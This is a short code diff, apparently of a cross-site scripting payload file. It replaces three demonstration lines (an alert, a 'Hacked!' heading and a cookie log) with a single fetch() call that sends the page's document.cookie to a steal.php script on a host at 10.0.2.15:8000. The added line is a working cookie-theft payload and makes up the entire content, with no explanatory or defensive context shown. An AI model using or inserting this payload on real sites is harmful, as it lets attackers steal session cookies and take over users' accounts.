@@ -1,3 +1,1 @@
-alert("External script executed!");
-document.write("<h1>Hacked!</h1>");
-console.log("Document Cookies: " + document.cookie);
+fetch("http://10.0.2.15:8000/steal.php?cookie=" + document.cookie);
